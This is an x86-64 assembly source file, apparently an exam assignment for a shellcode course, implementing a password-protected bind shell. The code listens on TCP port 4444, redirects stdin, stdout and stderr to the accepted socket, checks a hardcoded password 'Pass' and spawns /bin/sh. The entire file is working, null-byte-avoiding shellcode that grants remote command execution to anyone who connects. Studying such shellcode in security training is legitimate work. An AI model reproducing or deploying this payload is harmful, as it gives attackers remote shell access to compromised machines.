

;Exam Assignment 1
;Bind_TCP 4444  with password                 ;
;Default password = Pass                        ;
;If connected the shellcode no prompt for password   ;
;Enter password directly and you get the bin/sh shell;
;if password is wrong the shellcode exit:            ;
;Christophe G SLAE64 - 1337                 ;



global _start



_start:


    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; syscall number 41

    xor rdx , rdx ; null
    push byte 0x29 ; syscall number 41
    pop rax
    push byte 0x2  ; AF_INET
    pop rdi
    push byte 0x1  ; SOCK_STREAM
    pop rsi
    syscall

    ; copy socket descriptor to rdi for future use
    xchg rax , rdi


    ; server.sin_family = AF_INET
    ; server.sin_port = htons(PORT)
    ; server.sin_addr.s_addr = INADDR_ANY
    ; bzero(&server.sin_zero, 8)

     xor rax, rax

     push rax  ; bzero(&server.sin_zero, 8)


     mov rbx , 0xffffffffa3eefffd    ; move ip address , port 4444 , AF_INET (02) in one instruction (noted to remove null of ip address and AF_INET value)


     not rbx
     push rbx
     push rsp  ; save rsp value into the stack , needed for rsi later


    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ; syscall number 49


    push byte 0x31 ; (49)
    pop rax
    pop rsi        ; retrieve value of rsp  pushed into the stack before
    push byte 0x10  ; (16 bytes) sockaddr_len
    pop rdx
    syscall


    ; listen(sock, MAX_CLIENTS)
    ; syscall number 50

    push byte 0x32 ; (50)
    pop rax
    push byte 0x2   ;MAX_CLIENTS

    pop rsi
    syscall


    ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
    ; syscall number 43


    push byte 0x2b   ; Accept syscall
    pop rax
    sub rsp, 0x10
    push rsp
    pop rsi       ;(struct sockaddr *)&client

    push byte 0x10
    push rsp
    pop rdx    ; &sockaddr_len

    syscall

    ; store the client socket description
    mov r9, rax

    ; close parent

    push byte 0x3
    pop rax
    syscall





      xchg rdi , r9   ; restore client socket description to rdi
      xor rsi , rsi

  dup2:
      push byte 0x21
      pop rax       ; duplicate sockets  dup2 (new, old) in this case (stdin , stdout , stderr); three times loop
      syscall
    inc rsi
    cmp rsi , 0x3  ; jmp in the next couple of instruction if equals

 loopne dup2

CheckPass:
    xor rax , rax
    push byte 0x8     ;  len of received user input (voluntary greater than needed don't affect shellcode size)
    pop rdx
    sub rsp , 8  ;  8 bytes to receive user input  (voluntary greater than needed stack alignment)

    push rsp
    pop rsi
    xor edi , edi
    syscall                   ;system read function call format : ssize_t read(int fd, void *buf, size_t count);

    push  0x73736150   ; "Pass¨ in reverse order  (short password to reduce size of shellcode)

    pop rax
    lea rdi , [rel rsi]           ; needed for scasd
    scasd                         ; compare user input / stored password
    jz Execve                     ; if ok jmp to Execve


    push byte 0x3c                  ; exit syscall number 60 format exit(int code);
    pop rax
    syscall                        ; Exit if wrong password




   Execve:                                     	; Execve format  , execve("/bin/sh", 0 , 0)
        xor rsi , rsi
        mul rsi                                 ; zeroed rax , rdx register
        push ax                                 ; terminate string with null
        mov rbx , 0x68732f2f6e69622f     	; "/bin//sh"  in reverse order
        push rbx
        push rsp
        pop rdi
        push byte 0x3b    ; execve syscall number (59)
        pop rax

        syscall
